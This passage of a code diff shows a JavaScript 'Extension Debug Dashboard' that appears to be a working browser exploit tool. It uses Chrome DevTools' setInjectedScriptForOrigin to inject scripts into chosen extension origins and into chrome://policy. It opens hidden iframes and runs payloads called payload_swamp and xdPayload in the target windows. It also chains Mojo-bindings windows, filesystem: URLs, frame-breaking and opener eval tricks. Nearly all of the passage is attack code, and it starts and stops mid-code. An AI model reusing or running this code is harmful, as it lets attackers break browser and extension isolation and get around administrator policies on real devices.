+                 const writeFile = (name, content) => new Promise((res, rej) => { if (!window.webkitRequestFileSystem) return rej("FS API missing"); webkitRequestFileSystem(window.TEMPORARY, 2*1024*1024, (fs) => fs.root.getFile(name,{create:true},(e)=>e.createWriter((w)=>{w.onwriteend=()=>res(e.toURL());w.onerror=rej;w.write(new Blob([content]));},rej),rej),rej); });
+                 const htmlContent = `<html><body><p>Loading frame...</p><iframe src="filesystem:${location.origin}/temporary/nothing.html"></iframe><script>console.log("Inner script running");if(top!==window){try{top.location.replace(location.href)}catch(e){console.error("Frame break failed:",e)}};window.onerror=console.error;</script></body></html>`;
+                 (async () => { try { console.log("Mojo: Writing file..."); const url = await writeFile('index.html', htmlContent); console.log("Mojo: File written:", url); if (opener && opener.postMessage) { opener.postMessage({ url: url }, '*'); } else { console.error("Mojo: Cannot post back to opener.");} } catch (err) { console.error('Mojo Error:', err); } finally { setTimeout(() => { try{window.close();}catch(e){} }, 800); } })();
             }
 
-            // --- Stringified Helper Functions within xdPayload ---
-            // This function runs in the context of the new Mojo bindings window
-            function createAndWriteFileInMojoContext() {
-                // Filesystem logic, needs to be self-contained or use passed data
-                 function writeFile(filename, content) {
-                     return new Promise((resolve, reject) => {
-                         if (!window.webkitRequestFileSystem) return reject("Filesystem API missing");
-                         webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, (fs) => {
-                             fs.root.getFile(filename, { create: true }, (entry) => {
-                                 entry.createWriter((writer) => {
-                                     writer.onwriteend = () => resolve(entry.toURL());
-                                     writer.onerror = reject;
-                                     writer.write(new Blob([content]));
-                                 }, reject);
-                             }, reject);
-                         }, reject);
-                     });
-                 }
-
-                 // The HTML to write, including the iframe pointing nowhere initially
-                 // and the top-level check/redirect script.
-                const htmlFileContent = `<html><head></head><body>
-                    <p>Loading frame...</p>
-                    <iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
-                    <script>
-                    console.log("Inner script running");
-                    // Basic error logging
-                    window.onerror = function(message, source, lineno, colno, error) {
-                       console.error("Error in inner page:", message, "at", source, lineno, colno, error);
-                       // alert("Error: " + message); // Avoid alert here unless debugging
-                    };
-                    // Attempt to break out of any frame if this somehow gets framed itself
-                    if (top !== window) {
-                       console.warn("Trying to break out of frame...");
-                       try {
-                           top.location.replace(location.href);
-                       } catch (e) {
-                           console.error("Failed to break out of frame:", e);
-                       }
-                    };
-                    console.log("Inner script finished.");
-                    </script>
-                    </body></html>`;
-
-                 // Execute the write and post message back
-                 (async () => {
-                     try {
-                         console.log("Attempting to write file to filesystem from Mojo context...");
-                         const url = await writeFile('index.html', htmlFileContent);
-                         console.log("File written, URL:", url);
-                         if (opener && typeof opener.postMessage === 'function') {
-                            console.log("Posting URL back to opener");
-                             opener.postMessage({ url: url }, '*'); // Post URL back to the DevTools UI window
-                         } else {
-                             console.error("Cannot post message back to opener.");
-                         }
-                         // Close this Mojo tab after a delay
-                         setTimeout(() => { try { window.close(); } catch(e){} }, 800);
-                     } catch (error) {
-                         console.error('Error writing file or posting message:', error);
-                         alert('Error in Mojo Context: ' + error);
-                          // Attempt to close even on error
-                         setTimeout(() => { try { window.close(); } catch(e){} }, 800);
-                     }
-                 })();
-            } // end createAndWriteFileInMojoContext
-
-            // --- Main logic for xdPayload ---
             chrome.tabs.getCurrent((tab) => {
-                 if (chrome.runtime.lastError || !tab) {
-                     alert(`Error getting current tab: ${chrome.runtime.lastError?.message || 'Unknown error'}`);
-                     return;
-                 }
-                console.log("Creating new window for Mojo bindings...");
+                 if (chrome.runtime.lastError || !tab) { alert(`Error getting current tab: ${chrome.runtime.lastError?.message}`); return; }
                  chrome.windows.create({ url: MOJO_BINDINGS_URL, setSelfAsOpener: true }, (winInfo) => {
-                      if (chrome.runtime.lastError || !winInfo || !winInfo.tabs || !winInfo.tabs.length) {
-                         alert(`Error creating Mojo window: ${chrome.runtime.lastError?.message || 'Unknown error'}`);
-                         return;
-                     }
+                      if (chrome.runtime.lastError || !winInfo?.tabs?.length) { alert(`Error creating Mojo window: ${chrome.runtime.lastError?.message}`); return; }
                      const mojoTabId = winInfo.tabs[0].id;
-                     console.log(`Mojo window created, tab ID: ${mojoTabId}. Executing script...`);
+                     chrome.tabs.executeScript(mojoTabId, { code: `(${createAndWriteFileInMojoContext.toString()})()` }, () => { if (chrome.runtime.lastError) { alert(`Mojo exec script error: ${chrome.runtime.lastError.message}`); } });
 
-                     // Execute the filesystem writer in the new Mojo tab
-                     chrome.tabs.executeScript(mojoTabId, {
-                         code: `(${createAndWriteFileInMojoContext.toString()})()`
-                     }, () => {
-                         if (chrome.runtime.lastError) {
-                            alert(`Error executing script in Mojo tab: ${chrome.runtime.lastError.message}`);
-                            console.error("Mojo executeScript failed:", chrome.runtime.lastError.message);
-                         } else {
-                            console.log("Script execution requested in Mojo tab.");
-                         }
-                     });
-
-                     // --- Message Handling (in DevTools UI context) for XD payload ---
-                     // This `onmessage` handles the URL sent back from the Mojo context
-                     // And then proceeds to handle the 'acc'/'ack' handshake.
+                     // --- Message Handling (in DevTools UI) for XD ---
                      const messageHandler = (event) => {
-                         if (event.source !== winInfo.window) { // Ensure message is from the new window (might be too strict if window ref changes)
-                            // Check origin instead? Or use a nonce? For now, simple check.
-                           // console.log("Ignoring message from unexpected source:", event.source);
-                           // return;
-                         }
-
-                         // Handle URL sent from Mojo context's filesystem writer
+                         // Simplistic check - ideally verify source/origin if possible
+                         // if (event.source !== winInfo.window) return;
                          if (event.data && event.data.url) {
-                             console.log("Received filesystem URL from Mojo context:", event.data.url);
-                             // Setup the next stage: waiting for 'acc' from the target page (loaded via filesystem URL)
+                             console.log("XD Flow: Received filesystem URL:", event.data.url);
                              const fileSystemUrl = event.data.url;
+                             window.removeEventListener('message', messageHandler); // Cleanup this listener
 
-                            // Nested message handler for the 'acc'/'ack' phase
                              const accAckHandler = (accEvent) => {
                                  if (accEvent.data && accEvent.data.type === 'acc') {
-                                     console.log("Received 'acc' message. Sending 'ack'.");
-                                     // Prevent unload during navigation? Original code had while(true). Risky. Let's just log.
-                                     console.warn("Original code had 'onunload = while(true)' here. Removing harmful pattern.");
-                                     // onunload = () => { console.log("Unload blocked temporarily."); return "unload blocked"; }; // Less harmful alternative? Still risky.
-
-                                     // Send 'ack' back to the source (the filesystem page)
-                                     if (accEvent.source && typeof accEvent.source.postMessage === 'function') {
-                                         accEvent.source.postMessage({ type: 'ack' }, '*'); // '*' is potentially insecure, use specific origin if possible
-                                         console.log("Sent 'ack'.");
-
-                                          // PROBLEM: Original code navigates `top.location.replace("")` here.
-                                          // Where should it navigate? To the filesystem URL?
-                                          // This seems like a crucial missing piece or misunderstanding of the flow.
-                                          // For now, let's log the intended navigation and the URL we have.
-                                          console.warn("Original logic intended navigation here: top.location.replace('') - Target URL is unclear. Possibility:", fileSystemUrl);
-                                           // Example: Try navigating the original (likely DevTools) window to the fs url? Seems odd.
-                                           // window.location.href = fileSystemUrl;
-                                           // Or navigating the source of 'acc' (the filesystem page iframe)? That seems more likely.
-                                           // accEvent.source.location.href = fileSystemUrl; // Risky if source is cross-origin
-
-                                     } else {
-                                        console.error("Cannot send 'ack', source invalid.");
-                                     }
-
-                                     // Clean up this listener
-                                     window.removeEventListener('message', accAckHandler);
-                                     // Restore normal unload behavior
-                                    // onunload = null;
+                                     console.log("XD Flow: Received 'acc', sending 'ack'.");
+                                     window.removeEventListener('message', accAckHandler); // Cleanup this listener
+                                     if (accEvent.source && accEvent.source.postMessage) {
+                                         accEvent.source.postMessage({ type: 'ack' }, '*'); // Consider origin
+                                         console.log("XD Flow: Sent 'ack'.");
+                                          // Navigation logic from original code is unclear, logging instead
+                                          console.warn("XD Flow: Original code navigated top.location.replace('') here. Target is ambiguous. Skipping navigation.");
+                                          // If navigation *is* desired, potential targets:
+                                          // window.location.href = fileSystemUrl; // Navigate DevTools window
+                                          // accEvent.source.location.href = fileSystemUrl; // Navigate the source iframe (likely intended but risky)
+                                     } else { console.error("XD Flow: Cannot send 'ack', source invalid."); }
                                  }
-                             }; // end accAckHandler
-
+                             };
                              window.addEventListener('message', accAckHandler);
-                             console.log("Set up listener for 'acc' message.");
-
-                             // Cleanup the outer message listener (for the URL)
-                             window.removeEventListener('message', messageHandler);
-
-                         } else if (event.data && event.data.type === 'acc') {
-                             // If 'acc' arrives *before* the URL somehow, handle it via the dedicated handler
-                             // This requires accAckHandler to be defined above. Let's ensure that happens.
-                              console.warn("Received 'acc' message potentially out of order.");
-                              // This path indicates the accAckHandler might need to be set up earlier
-                              // or handle this case directly if the URL is not needed for the 'ack' response/navigation.
-                              // Let's call a hypothetical preconfigured handler if it exists
-                              // handleAccMessage(event); // Assuming handleAccMessage is defined and deals with this.
-
-                         } else {
-                            // Log unexpected messages
-                            // console.log("Received other message:", event.data);
+                             console.log("XD Flow: Set up listener for 'acc' message.");
                          }
-                     }; // end messageHandler (handling URL and setting up 'acc' listener)
-
+                     };
                      window.addEventListener('message', messageHandler);
-                     console.log("Set up listener for URL message from Mojo context.");
+                     console.log("XD Flow: Set up listener for URL message from Mojo context.");
                  });
-             }); // end getCurrent tab
-
+             });
         } // end xdPayload
 
         // --- Main UI Setup ---
-
         function setupUI() {
             console.log("Setting up DevTools UI...");
             document.open();
-            document.write(atob(PLACEHOLDER_HTML_ENTRY || "PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5EYXNoYm9hcmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5Pgo8aDE+RGV2VG9vbHMgSW50ZXJmYWNlPC9oMT4KPHA+QWN0aW9uczo8L3A+Cjx1bD4KCTxsaT48YnV0dG9uIGlkPSJhY3RpdmF0ZSI+QWN0aXZhdGUgKERlZmF1bHQgUERGKTwvYnV0dG9uPjwvbGk+Cgk8bGk+PGJ1dHRvbiBpZD0iYWN0aXZhdGUyIj5BY3RpdmF0ZSBTcGVjaWFsIChYRCBQREYpPC9idXR0b24+PC9saT4KCTxsaT48YnV0dG9uIGlkPSJleHRkYmciPkRlYnVnIE90aGVyIEV4dGVuc2lvbjwvYnV0dG9uPjwvbGk+Cgk8bGk+PGJ1dHRvbiBpZD0iY2xlYW51cCI+Q2xlYW51cCBGaWxlc3lzdGVtPC9idXR0b24+PC9saT4KCTxsaT48YnV0dG9uIGlkPSJkZXZkYmciPkRlYnVnIERldlRvb2xzIChFdmFsKTwvYnV0dG9uPjwvbGk+Cgk8bGk+PGJ1dHRvbiBpZD0idXBkYXRlciI+Q2hlY2sgZm9yIFVwZGF0ZXI8L2J1dHRvbj48L2xpPgo8L3VsPgo8cD5IYXJkY29kZWQgRXh0ZW5zaW9uczo8L3A+CjwhLS0gQWRkIG1vcmUgaGFyZGNvZGVkIGJ1dHRvbnMgYXMgbmVlZGVkIC0tPgo8dWwgY2xhc3M9ImhhcmRjb2RlZC1saXN0Ij4KICAgIDxsaT48YnV0dG9uIGNsYXNzPSJoYXJkY29kZWQiIGV4dD0iZWplbWRkaWhlbmtvZGZoZWxtZmJhaGdjaWdrYWZpZGMiPkV4YW1wbGUgRXh0IDGPC9idXR0b24+PC9saT4KICAgIDxsaT48YnV0dG9uIGNsYXNzPSJoYXJkY29kZWQiIGV4dD0ibmhwaXBkZ2VhbGdkbWxkZGVtYWZubGlsa2lvZ25kYSI+RXhhbXBsZSBFeHQgMjwvYnV0dG9uPjwvbGk+CjwvdWw+CjxoMj5Mb2dnZWQgSWZyYW1lczo8L2gyPgo8cHJlIGlkPSJsb2ciPjwvcHJlPgo8L2JvZHk+CjwvaHRtbD4=")); // Provide a basic fallback HTML structure
+            // Decode the Base64 HTML for the UI itself
+            try {
+                document.write(decodeURIComponent(escape(atob(PLACEHOLDER_HTML_ENTRY_B64))));
+            } catch (e) {
+                 console.error("Error decoding/writing HTML Entry Point:", e);
+                 document.write("<html><body><h1>Error loading UI</h1></body></html>"); // Fallback
+            }
             document.close();
             document.title = "Extension Debug Dashboard";
 
             if (!window.InspectorFrontendHost) {
-                alert("InspectorFrontendHost is not available. Extension debugging features will not work.");
-                console.error("InspectorFrontendHost not found!");
-                // Disable buttons that rely on it?
+                console.error("InspectorFrontendHost is not available!");
+                // Optionally disable buttons or show a warning in the UI
+                const buttons = document.querySelectorAll('button');
+                 buttons.forEach(btn => {
+                    if(btn.id !== 'updater' && btn.id !== 'devdbg') { // Keep updater/eval enabled maybe?
+                        btn.disabled = true;
+                        btn.title = "InspectorFrontendHost API not available.";
+                    }
+                 });
+                 const heading = document.querySelector('h1');
+                 if (heading) heading.textContent += " (Inspector API Missing!)";
             }
 
             attachEventListeners();
@@ -585,404 +1493,169 @@
 
         /** Attaches event listeners to the UI elements */
         function attachEventListeners() {
-            document.querySelector('#activate')?.addEventListener('click', () => {
-                console.log("Activate (Default PDF) clicked.");
-                debugExtensionInteraction(false, PDF_EXTENSION_ID); // Default payload_swamp
-            });
-
-            document.querySelector('#activate2')?.addEventListener('click', () => {
-                console.log("Activate Special (XD PDF) clicked.");
-                 // Pass the xdPayload function string for injection
-                debugExtensionInteraction(false, PDF_EXTENSION_ID, xdPayload.toString());
-            });
-
-             document.querySelector('#extdbg')?.addEventListener('click', () => {
-                console.log("Debug Other Extension clicked.");
-                 debugExtensionInteraction(false); // Will prompt for ID, use default payload_swamp
-             });
-
-            document.querySelectorAll('.hardcoded').forEach(el => {
-                el.addEventListener('click', () => {
-                    const extId = el.getAttribute("ext");
-                    console.log(`Hardcoded extension "${el.innerText}" clicked. ID: ${extId}`);
-                    if (extId) {
-                        debugExtensionInteraction(false, extId); // Default payload_swamp
-                    } else {
-                        console.warn("Hardcoded button clicked but missing 'ext' attribute.");
-                    }
-                });
-            });
-
-            document.querySelector('#cleanup')?.addEventListener('click', () => {
-                 console.log("Cleanup Filesystem clicked.");
-                 debugExtensionInteraction(true); // Will prompt for ID, uses cleanup flag
-            });
-
+            document.querySelector('#activate')?.addEventListener('click', () => debugExtensionInteraction(false, PDF_EXTENSION_ID));
+            document.querySelector('#activate2')?.addEventListener('click', () => debugExtensionInteraction(false, PDF_EXTENSION_ID, xdPayload.toString()));
+            document.querySelector('#extdbg')?.addEventListener('click', () => debugExtensionInteraction(false));
+            document.querySelectorAll('.hardcoded').forEach(el => el.addEventListener('click', () => { const id=el.getAttribute("ext"); if(id) debugExtensionInteraction(false, id); }));
+            document.querySelector('#cleanup')?.addEventListener('click', () => debugExtensionInteraction(true));
             document.querySelector('#updater')?.addEventListener('click', handleUpdaterCheck);
             document.querySelector('#devdbg')?.addEventListener('click', handleDevtoolsDebugEval);
-
-             // Listener for messages from created iframes (e.g., cleanup requests)
             window.addEventListener('message', handleIframeMessages);
         }
 
         /** Handles messages originating from the spawned iframes */
         function handleIframeMessages(event) {
-             // Basic security check: should ideally check origin
-            // if (event.origin !== expectedOrigin) return;
-
             const data = event.data;
             if (data && data.type === IFRAME_TRACKER_EVENT_REMOVE && typeof data.uid !== 'undefined') {
-                 console.log(`Received request to remove iframe with ID: ${data.uid}`);
                  iframeManager.remove(data.uid);
                  updateIframeLog();
-            } else if (data && data.type === BROWSER_INIT_NAVIGATE_EVENT) {
-                 // This message type seems intended to make the DevTools window navigate?
+            } else if (data && data.type === BROWSER_INIT_NAVIGATE_EVENT && data.url) {
                  console.warn(`Received ${BROWSER_INIT_NAVIGATE_EVENT}. Attempting navigation to:`, data.url);
                  if (event.source && typeof event.source.location?.replace === 'function') {
-                    // Is it intended to navigate the source frame or the main (DevTools) window?
-                    // Original code implies navigating the source (ev.source.location.replace).
-                    try {
-                        event.source.location.replace(data.url);
-                    } catch (e) {
-                       console.error("Error trying to navigate source frame:", e) ;
-                       // Fallback/Alternative: Navigate the DevTools window itself?
-                       // window.location.href = data.url;
-                    }
-                 } else {
-                    console.error("Cannot navigate: invalid source or replace function.");
-                 }
+                    try { event.source.location.replace(data.url); } // Navigate source frame
+                    catch (e) { console.error("Error navigating source frame:", e); }
+                 } else { console.error("Cannot navigate: invalid source."); }
             }
-             // NOTE: The 'acc'/'ack' handshake is handled specifically within the xdPayload flow currently.
-             // If it needs to be more generic, it should be integrated here.
+            // 'acc'/'ack' handled within xdPayload flow
         }
 
         /** Initiates interaction with a target extension */
         function debugExtensionInteraction(isCleanup = false, targetExtensionId = null, specificPayload = null) {
              const extensionId = targetExtensionId || prompt('Enter Target Extension ID:');
-             if (!extensionId || extensionId === "cancel") {
-                 console.log("Extension interaction cancelled.");
-                 return;
+             if (!extensionId || extensionId === "cancel") return;
+
+             let manifestPath = '/manifest.json';
+             let payloadToInject = specificPayload || payload_swamp.toString();
+
+             // Special handling for PDF viewer
+             if (extensionId === PDF_EXTENSION_ID) {
+                 manifestPath = '/index.html'; // Use index.html for PDF viewer
+                 console.log("Targeting PDF Viewer.");
+                 // If using the default payload, handle the CHROMEPAYLOAD placeholder specifically
+                 if (payloadToInject === payload_swamp.toString()) {
+                     // Replace %%CHROMEPAYLOAD%% B64 placeholder within the payload_swamp string
+                     payloadToInject = payloadToInject.replaceAll('%%PLACEHOLDER_CHROME_PAYLOAD_B64%%', PLACEHOLDER_CHROME_PAYLOAD_B64);
+
+                     // Set injected script for chrome://policy (as per original structure)
+                     try {
+                         console.warn("Setting injected script for chrome://policy origin.");
+                         // Decode the payload JS first, then append '//'
+                         const policyJS = decodeURIComponent(escape(atob(PLACEHOLDER_CHROME_PAYLOAD_B64))) + '//';
+                         InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', policyJS);
+                     } catch (e) {
+                         console.error("Failed to set injected script for chrome://policy:", e);
+                         // Don't necessarily abort, but log the error
+                     }
+                 }
              }
 
-             let manifestPath = '/manifest.json'; // Default path
-             let payloadToInject = specificPayload || payload_swamp.toString(); // Use specific payload or default swamp
+             // Replace EXTJS and EXTHTML placeholders in the selected payload string
+             payloadToInject = payloadToInject.replaceAll('%%PLACEHOLDER_EXT_JS_B64%%', PLACEHOLDER_EXT_JS_B64);
+             payloadToInject = payloadToInject.replaceAll('%%PLACEHOLDER_EXT_HTML_B64%%', PLACEHOLDER_EXT_HTML_B64);
+             // Ensure CHROMEPAYLOAD is replaced if not PDF context (or handled above)
+             payloadToInject = payloadToInject.replaceAll('%%PLACEHOLDER_CHROME_PAYLOAD_B64%%', PLACEHOLDER_CHROME_PAYLOAD_B64);
 
-            // Special handling for the PDF viewer extension
-             if (extensionId === PDF_EXTENSION_ID) {
-                 console.log("Targeting PDF Viewer Extension.");
-                 manifestPath = 'index.html'; // Specific entry point for PDF viewer hack?
-
-                 // If using the default payload_swamp for PDF, prompt for the inner payload
-                 if (payloadToInject === payload_swamp.toString()) {
-                    const jsCode = prompt("Enter JavaScript code to execute via chrome.tabs.executeScript (will be Base64 encoded):");
-                     if (!jsCode || jsCode === "cancel") {
-                         console.log("PDF payload entry cancelled.");
-                         return;
-                     }
-                    payloadToInject = payloadToInject.replace('%%CHROMEPAYLOAD%%', btoa(jsCode));
-                     // The original code also set an injected script for chrome://policy here.
-                     // This seems highly suspicious and potentially dangerous. Replicating with caution.
-                     // Requires understanding what 'jsCode + "//"' is intended to do.
-                     try {
-                        console.warn("Attempting to set injected script for chrome://policy origin (potential security risk).");
-                        // The appended "//" might be syntax to make it a valid script/comment? Needs verification.
-                        InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', jsCode + '//');
-                    } catch (e) {
-                       console.error("Failed to set injected script for chrome://policy:", e);
-                       alert("Failed to set injected script for chrome://policy. See console.");
-                       // Should we abort here? Depends on whether this is critical.
-                    }
-                }
-            } else {
-                // Ensure placeholders are handled or removed for generic extensions if they aren't replaced externally
-                payloadToInject = payloadToInject.replace('%%CHROMEPAYLOAD%%', "''"); // Avoid errors if not replaced
-            }
-
-            // --- Injection Script ---
-            // This script runs briefly in the extension's context when the iframe loads.
-            // It sets up a message listener to receive UID and config, then opens the actual target path
-            // in a new window, passing the UID/config along. It also defines window.cleanup.
+             // --- Injection Script Wrapper ---
              const injectionWrapper = `
-                console.log("Injection wrapper running in ${location.origin}");
-                // Define cleanup function early
-                window.cleanup = () => {
-                    if (window.sys && typeof window.sys.passcode !== 'undefined') {
-                        console.log("Cleanup called, posting message to parent with UID:", window.sys.passcode);
-                         window.parent.postMessage({ type: '${IFRAME_TRACKER_EVENT_REMOVE}', uid: window.sys.passcode }, '*');
-                    } else {
-                       console.warn("Cleanup called but missing sys info.");
-                    }
-                };
-                 window.onmessage = (event) => {
-                     // Basic origin check recommended here in production
-                     console.log("Received message in injection wrapper:", event.data);
-                     if (event.data && typeof event.data.passcode !== 'undefined') {
-                        console.log("Received UID/config:", event.data);
-                        window.sys = event.data; // Store UID and config (like cleanup flag)
-                        // Prevent this listener from firing again if multiple messages arrive
-                        window.onmessage = null;
-
-                        const targetPath = '${manifestPath}'; // Path received from outer scope
+                console.log("Injection wrapper running in " + location.origin);
+                window.cleanup = () => { if (window.sys?.passcode !== undefined) { window.parent?.postMessage({ type: '${IFRAME_TRACKER_EVENT_REMOVE}', uid: window.sys.passcode }, '*'); } };
+                window.onmessage = (event) => {
+                     if (event.data?.passcode !== undefined) {
+                        window.sys = event.data;
+                        window.onmessage = null; // Process only once
+                        const targetPath = '${manifestPath}';
                         const targetUrl = new URL(targetPath, location.origin).href;
-                        console.log("Opening target URL:", targetUrl);
-
+                        console.log("Opening target:", targetUrl);
                         const targetWindow = window.open(targetUrl);
-
                         if (targetWindow) {
-                             // Inject the main payload (payload_swamp or xdPayload string) into the new window
                              targetWindow.onload = () => {
                                 console.log("Target window loaded:", targetUrl);
-                                try {
-                                    // Execute the actual payload function in the target window's context
-                                     (${payloadToInject})(targetWindow, window.sys);
-                                 } catch (e) {
-                                     console.error("Error executing injected payload:", e);
-                                     alert("Error in injected payload: " + e.message);
-                                     window.cleanup(); // Attempt cleanup on error
-                                     try { targetWindow.close(); } catch(err){}
-                                 }
+                                try { (${payloadToInject})(targetWindow, window.sys); }
+                                catch (e) { console.error("Payload exec error:", e); window.cleanup(); try{targetWindow.close();}catch(e){} }
                             };
-                             // Handle cases where the window fails to load (e.g., blocked popup)
-                            targetWindow.onerror = (err) => {
-                                console.error("Error loading target window:", targetUrl, err);
-                                alert("Failed to load target window: " + targetUrl);
-                                window.cleanup();
-                            };
-                         } else {
-                            console.error("Failed to open target window:", targetUrl);
-                            alert("Failed to open target window. Popup blocker?");
-                            window.cleanup(); // Cleanup if window fails to open
-                        }
+                            targetWindow.onerror = (e) => { console.error("Target window load error:", targetUrl, e); window.cleanup(); };
+                         } else { console.error("Failed to open target window."); window.cleanup(); }
                     }
-                };
-            `;
-            // --- End Injection Script ---
-
+                };`;
+             // --- End Injection Script ---
 
              const extensionOrigin = `chrome-extension://${extensionId}`;
-             console.log(`Injecting script wrapper for origin: ${extensionOrigin}`);
+             console.log(`Injecting for origin: ${extensionOrigin}`);
              try {
-                 // Set up the script that will run inside the initial iframe
+                 if (!window.InspectorFrontendHost || typeof window.InspectorFrontendHost.setInjectedScriptForOrigin !== 'function') {
+                     throw new Error("InspectorFrontendHost API not available.");
+                 }
                  InspectorFrontendHost.setInjectedScriptForOrigin(extensionOrigin, injectionWrapper);
 
-                 // Create the iframe to trigger the injection
                  const iframe = document.createElement("iframe");
-                 iframe.src = `${extensionOrigin}${manifestPath}`; // Load manifest/entry point to trigger script
-                 iframe.style.display = 'none'; // Keep it hidden
+                 iframe.src = `${extensionOrigin}${manifestPath}`;
+                 iframe.style.display = 'none';
                  document.body.appendChild(iframe);
-
                  const iframeId = iframeManager.add(iframe);
-                 console.log(`Created iframe with ID: ${iframeId}, loading: ${iframe.src}`);
                  updateIframeLog();
 
                  iframe.onload = () => {
-                    console.log(`Iframe ${iframeId} loaded. Posting UID/config to it.`);
-                    if (iframe.contentWindow) {
-                         iframe.contentWindow.postMessage({
-                            type: IFRAME_TRACKER_EVENT_UID_PASS,
-                             passcode: iframeId,
-                            cleanup: isCleanup // Pass the cleanup flag
-                         }, '*'); // Consider targetOrigin `extensionOrigin` for better security
-                     } else {
-                        console.error(`Cannot post message to iframe ${iframeId}: contentWindow is null.`);
-                        iframeManager.remove(iframeId); // Clean up broken iframe
-                        updateIframeLog();
-                    }
+                    console.log(`Iframe ${iframeId} loaded. Posting config.`);
+                    iframe.contentWindow?.postMessage({ type: IFRAME_TRACKER_EVENT_UID_PASS, passcode: iframeId, cleanup: isCleanup }, extensionOrigin); // Target origin
                  };
-                 iframe.onerror = (err) => {
-                     console.error(`Error loading iframe ${iframeId} for ${extensionOrigin}:`, err);
-                     alert(`Failed to load iframe for extension ${extensionId}. Check ID and permissions.`);
-                     iframeManager.remove(iframeId);
-                     updateIframeLog();
-                 };
+                 iframe.onerror = (e) => { console.error(`Iframe ${iframeId} load error:`, e); iframeManager.remove(iframeId); updateIframeLog(); };
 
-             } catch (e) {
-                 console.error("Error setting injected script or creating iframe:", e);
-                 alert(`Error interacting with extension ${extensionId}: ${e.message}. See console.`);
-             }
+             } catch (e) { console.error(`Error interacting with ${extensionId}:`, e); alert(`Interaction Error: ${e.message}`); }
          } // end debugExtensionInteraction
-
 
         /** Updates the display log of active iframes */
         function updateIframeLog() {
-             const logElement = document.getElementById('log');
-             if (logElement) {
-                logElement.textContent = `Active Iframes: ${Object.keys(iframeManager.iframes).length}\n`;
-                 for (const id in iframeManager.iframes) {
-                     logElement.textContent += ` - ID ${id}: ${iframeManager.iframes[id].src}\n`;
-                 }
+             const logEl = document.getElementById('log');
+             if (logEl) {
+                const ids = Object.keys(iframeManager.iframes);
+                logEl.textContent = `Active Iframes: ${ids.length}\\n` + ids.map(id => ` - ID ${id}: ${iframeManager.iframes[id].src}`).join('\\n');
              }
         }
 
-
         /** Handles the 'Check for Updater' button click */
         function handleUpdaterCheck() {
-            console.log("Checking for updates via WebSocket:", UPDATER_WEBSOCKET_PLACEHOLDER);
-             if (UPDATER_WEBSOCKET_PLACEHOLDER.includes("%%")) {
-                alert("Updater URL placeholder not replaced. Cannot check for updates.");
-                return;
-             }
+            const wsUrl = UPDATER_WEBSOCKET_PLACEHOLDER; // Use constant defined above
+            console.log("Checking updater via WebSocket:", wsUrl);
+             if (wsUrl.includes("%%")) { alert("Updater URL placeholder invalid."); return; }
 
-             // Disable default unload behavior that might block reload
-             // Note: Previous version had `while(true)`, which freezes. `null` is safe.
-             const previousOnUnload = window.onunload;
-             window.onunload = null;
+             const previousOnUnload = window.onunload; window.onunload = null; // Disable unload blocker
+             let ws; try { ws = new WebSocket(wsUrl); } catch (e) { alert(`WS Connect Error: ${e.message}`); window.onunload = previousOnUnload; return; }
 
-            let ws;
-            try {
-                ws = new WebSocket(UPDATER_WEBSOCKET_PLACEHOLDER);
-            } catch (e) {
-                alert(`Failed to create WebSocket connection: ${e.message}`);
-                console.error("WebSocket creation failed:", e);
-                window.onunload = previousOnUnload; // Restore unload handler
-                return;
-            }
-
-
-             ws.onopen = () => {
-                 console.log("WebSocket opened. Sending discovery request.");
-                 ws.send(JSON.stringify({
-                     method: "Target.setDiscoverTargets",
-                     id: Date.now(), // Use a somewhat unique ID
-                     params: { discover: true } // Assuming params should be {discover: true}
-                 }));
-             };
-
+             ws.onopen = () => ws.send(JSON.stringify({ method: "Target.setDiscoverTargets", id: Date.now(), params: { discover: true } }));
              ws.onmessage = (event) => {
-                 console.log("WebSocket message received:", event.data);
                  try {
-                     const message = JSON.parse(event.data);
-                     // Example logic: Look for a specific message type or URL
-                     // The original logic seems specific, adapt as needed.
-                     // This assumes a specific response format provides a URL to open.
-                     if (message?.params?.request?.url) {
-                         const targetUrl = message.params.request.url;
-                         console.log("Found target URL from WebSocket:", targetUrl);
+                     const msg = JSON.parse(event.data);
+                     // Simplified logic: look for any URL in response params to navigate to
+                     const targetUrl = msg?.params?.request?.url || msg?.params?.targetInfo?.url; // Adapt based on actual protocol
+                     if (targetUrl) {
+                         console.log("Updater found URL:", targetUrl);
                          ws.close();
-
-                         // Open URL via an intermediate blank window - often a trick to bypass popup blockers
-                         // or establish opener relationships.
-                         const intermediateWindow = window.open('', '_blank');
-                         if (intermediateWindow) {
-                             console.log("Opening intermediate window...");
-                              // Use try-catch for eval. Ensure URL is safe if possible.
-                             try {
-                                intermediateWindow.eval(`
-                                    console.log("Intermediate window executing opener...");
-                                    setTimeout(() => {
-                                        if (opener && typeof opener.open === 'function') {
-                                             // Base64 encode/decode adds complexity but might be for escaping issues
-                                             // Direct usage is simpler if targetUrl is safe and doesn't contain problematic chars
-                                             // const urlToOpen = atob("${btoa(targetUrl)}"); // Original method
-                                             const urlToOpen = "${targetUrl.replace(/"/g, '\\"')}"; // Simple escaped string
-                                             console.log("Opener opening:", urlToOpen);
-                                             opener.open(urlToOpen, '_blank');
-                                         } else {
-                                             console.error("Opener or opener.open is not available.");
-                                         }
-                                         console.log("Closing intermediate window.");
-                                         window.close();
-                                    }, 500); // Delay before opening actual URL
-                                `);
-                             } catch (e) {
-                                console.error("Error eval-ing in intermediate window:", e);
-                                try { intermediateWindow.close(); } catch (e2) {} // Close if eval failed
-                             }
-
-                             // Reload the current (DevTools) window after a delay
-                             console.log("Scheduling reload of DevTools window...");
-                             setTimeout(() => { location.reload(); }, 1000); // Reload after giving time for intermediate window
-
-                         } else {
-                             console.error("Failed to open intermediate window. Popup blocker?");
-                             alert("Failed to open intermediate window. Check popup blocker.");
-                             window.onunload = previousOnUnload; // Restore unload handler on failure
-                         }
-                     } else {
-                         console.log("WebSocket message did not contain expected URL.");
-                         // Keep listening or close? Depends on protocol. Assume close for now.
-                         // ws.close();
+                         const interWin = window.open('', '_blank');
+                         if (interWin) {
+                             try { interWin.eval(`setTimeout(()=>{opener?.open("${targetUrl.replace(/"/g, '\\"')}","_blank");window.close();},50)`); } catch(e){console.error("Intermediate win eval failed:",e); try{interWin.close();}catch(e2){}}
